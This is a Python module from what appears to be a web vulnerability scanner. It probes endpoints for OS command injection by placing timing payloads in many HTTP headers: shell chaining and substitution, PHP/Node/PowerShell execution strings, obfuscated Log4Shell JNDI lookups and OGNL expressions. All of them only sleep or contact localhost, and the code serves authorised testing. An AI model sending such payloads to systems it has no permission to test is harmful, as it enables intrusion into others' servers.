"""SentinelX module [27]: Command Injection via HTTP Headers.

Real implementation: injects time-based payloads into User-Agent, Referer,
X-Forwarded-For and detects via baseline-subtracted timing. Safe: sleep only.
"""

from __future__ import annotations

import re
import time

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
from sentinelx.core.baseline import adaptive_delay


TARGET_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "Cookie",
                  "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL", "True-Client-IP",
                  "CF-Connecting-IP", "X-Client-IP", "X-Remote-IP", "X-Remote-Addr",
                  "Accept-Language", "Accept", "Origin", "X-Requested-With"]

# (technique label, payload template with {d} = delay seconds)
HEADER_RCE_TECHNIQUES = [
    # --- TECHNIQUE: semicolon chaining ---
    ("semicolon", "sx; sleep {d}"),
    ("semicolon-bg", "sx; sleep {d} &"),
    # --- TECHNIQUE: pipe chaining ---
    ("pipe", "sx | sleep {d}"),
    ("pipe-err", "sx | sleep {d} 2>&1"),
    # --- TECHNIQUE: AND chaining ---
    ("and", "sx && sleep {d}"),
    ("and-quiet", "sx&&sleep {d}"),
    # --- TECHNIQUE: OR chaining ---
    ("or", "sx || sleep {d}"),
    # --- TECHNIQUE: command substitution ---
    ("dollar-paren", "sx$(sleep {d})"),
    ("backtick", "sx`sleep {d}`"),
    ("dollar-paren-sp", "sx $(sleep {d})"),
    # --- TECHNIQUE: newline injection ---
    ("newline", "sx\nsleep {d}"),
    ("newline-cr", "sx\r\nsleep {d}"),
    # --- TECHNIQUE: IFS tricks ---
    ("ifs", "sx;sleep${IFS}{d}"),
    ("ifs-tab", "sx;sleep%09{d}"),
    # --- TECHNIQUE: DNS exfil probe (safe: invalid domain, measures lookup) ---
    ("nslookup", "sx; nslookup sx-probe-{d}.invalid"),
    # --- TECHNIQUE: ping delay ---
    ("ping", "sx; ping -c {d} 127.0.0.1"),
    # --- TECHNIQUE: PHP wrappers (if header hits PHP) ---
    ("php-system", "sx; system('sleep {d}')"),
    # --- TECHNIQUE: Python os ---
    ("py-os", "sx'; __import__('time').sleep({d}) #"),
    # --- TECHNIQUE: Node child_process ---
    ("node-exec", "sx'); require('child_process').execSync('sleep {d}') //"),
    # --- TECHNIQUE: PowerShell ---
    ("powershell", "sx; Start-Sleep -s {d}"),
    # --- TECHNIQUE: log4shell probes (safe: invalid host, error oracle) ---
    ("log4j-ldap", "${jndi:ldap://127.0.0.1:9/sx}"),
    ("log4j-dns", "${jndi:dns://127.0.0.1:9/sx}"),
    ("log4j-nested", "${${::-j}${::-n}${::-d}${::-i}:ldap://127.0.0.1:9/sx}"),
    ("log4j-upper", "${JNDI:LDAP://127.0.0.1:9/sx}"),
    # --- TECHNIQUE: Spring4Shell-style ---
    ("spring", "sx; #{T(java.lang.Thread).sleep({d}000)}"),
    # --- TECHNIQUE: struts OGNL ---
    ("ognl", "sx%{#context['x']=(#t=#s).sleep({d}000)}"),
]

REMEDIATION_HDR = (
    "Never pass HTTP headers to shells. Treat all headers as untrusted input. "
    "Log headers safely without shell interpretation."
)


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    headers = {"User-Agent": config.user_agent}

    # baseline timing (2 samples, no injection)
    base_times = []
    for _ in range(2):
        t0 = time.monotonic()
        resp = await client.get(url, headers=headers, dedupe=False)
        if not resp:
            return findings
        base_times.append(time.monotonic() - t0)
    base_avg = sum(base_times) / len(base_times)
    base_max = max(base_times)
    delay = adaptive_delay(base_avg)
    d_int = max(2, int(delay))

    # technique groups x headers, high-signal first; early-stop per header
    for hname in TARGET_HEADERS:
        for tech_label, tmpl in HEADER_RCE_TECHNIQUES:
            payload = tmpl.format(d=d_int)
            h = dict(headers)
            if hname == "Cookie":
                h["Cookie"] = f"sx={payload}"
            else:
                h[hname] = payload
            samples = []
            for _ in range(2):
                t0 = time.monotonic()
                resp = await client.get(url, headers=h, dedupe=False)
                el = time.monotonic() - t0
                if not resp:
                    break
                samples.append(el)
            if len(samples) < 2:
                continue
            threshold = base_max + d_int * 0.7
            if all(s >= threshold for s in samples) and base_max < d_int * 0.5:
                ev = Evidence(
                    request_raw=raw_request("GET", url, h, None),
                    response_raw=raw_response(resp.status_code, dict(resp.headers), resp.content),
                    proof=(f"Header command injection via {hname} [{tech_label}] (2/2): "
                           f"{samples[0]:.1f}s/{samples[1]:.1f}s vs baseline {base_max:.2f}s"),
                )
                findings.append(Finding(
                    type="OS Command Injection", subtype=f"header-{hname}",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.85, url=url, method="GET", param=hname,
                    payload=payload, evidence=ev, cwe="CWE-78",
                    owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_HDR,
                    references=["https://owasp.org/www-community/attacks/Command_Injection"],
                ))
                break  # confirmed on this header -> next header
        if len(findings) >= 3:
            break  # enough signal; don't burn requests
    return findings
